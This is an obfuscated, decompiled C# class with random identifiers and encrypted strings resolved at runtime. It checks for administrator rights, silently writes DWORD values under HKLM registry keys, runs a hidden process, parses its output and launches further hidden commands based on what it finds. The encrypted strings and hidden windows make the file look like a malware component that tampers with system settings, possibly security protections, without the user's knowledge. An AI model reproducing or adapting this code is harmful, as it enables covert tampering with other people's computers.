using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gTywbHaKSaZFRYP;

public static class NpTTnDuHpFRBrnNY
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void XxBcCowaKmU()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			vJUuJtMZImvm(getString_0(107406608), getString_0(107406547), getString_0(107389848));
			vJUuJtMZImvm(getString_0(107406554), getString_0(107406493), getString_0(107407152));
			vJUuJtMZImvm(getString_0(107406980), getString_0(107406859), getString_0(107407152));
			vJUuJtMZImvm(getString_0(107406980), getString_0(107406854), getString_0(107407152));
			vJUuJtMZImvm(getString_0(107406980), getString_0(107406817), getString_0(107407152));
			BqQpOhGzboOb();
		}
	}

	private static void vJUuJtMZImvm(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void BqQpOhGzboOb()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393148),
			Arguments = getString_0(107406780),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107406199)) && text.EndsWith(getString_0(107406162)))
			{
				eGlbZaOUIPA(getString_0(107406185));
			}
			else if (text.StartsWith(getString_0(107406859)) && text.EndsWith(getString_0(107406162)))
			{
				eGlbZaOUIPA(getString_0(107406116));
			}
			else if (text.StartsWith(getString_0(107406047)) && text.EndsWith(getString_0(107406162)))
			{
				eGlbZaOUIPA(getString_0(107406014));
			}
			else if (text.StartsWith(getString_0(107406461)) && text.EndsWith(getString_0(107406162)))
			{
				eGlbZaOUIPA(getString_0(107406432));
			}
			else if (text.StartsWith(getString_0(107406371)) && text.EndsWith(getString_0(107406162)))
			{
				eGlbZaOUIPA(getString_0(107406314));
			}
			else if (text.StartsWith(getString_0(107406257)) && text.EndsWith(getString_0(107406162)))
			{
				eGlbZaOUIPA(getString_0(107405684));
			}
			else if (text.StartsWith(getString_0(107405591)) && text.EndsWith(getString_0(107406162)))
			{
				eGlbZaOUIPA(getString_0(107405558));
			}
			else if (text.StartsWith(getString_0(107405493)) && text.EndsWith(getString_0(107406162)))
			{
				eGlbZaOUIPA(getString_0(107405480));
			}
			else if (text.StartsWith(getString_0(107405915)) && text.EndsWith(getString_0(107406162)))
			{
				eGlbZaOUIPA(getString_0(107405886));
			}
			else if (text.StartsWith(getString_0(107405825)) && !text.EndsWith(getString_0(107405796)))
			{
				eGlbZaOUIPA(getString_0(107405791));
			}
			else if (text.StartsWith(getString_0(107405734)) && !text.EndsWith(getString_0(107389848)))
			{
				eGlbZaOUIPA(getString_0(107405169));
			}
			else if (text.StartsWith(getString_0(107405156)) && !text.EndsWith(getString_0(107405123)))
			{
				eGlbZaOUIPA(getString_0(107405118));
			}
			else if (text.StartsWith(getString_0(107405017)) && !text.EndsWith(getString_0(107405123)))
			{
				eGlbZaOUIPA(getString_0(107404980));
			}
			else if (text.StartsWith(getString_0(107405427)) && !text.EndsWith(getString_0(107405123)))
			{
				eGlbZaOUIPA(getString_0(107405394));
			}
			else if (text.StartsWith(getString_0(107405337)) && !text.EndsWith(getString_0(107405123)))
			{
				eGlbZaOUIPA(getString_0(107405300));
			}
		}
	}

	public static void eGlbZaOUIPA(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393148),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static NpTTnDuHpFRBrnNY()
	{
		Strings.CreateGetStringDelegate(typeof(NpTTnDuHpFRBrnNY));
	}
}
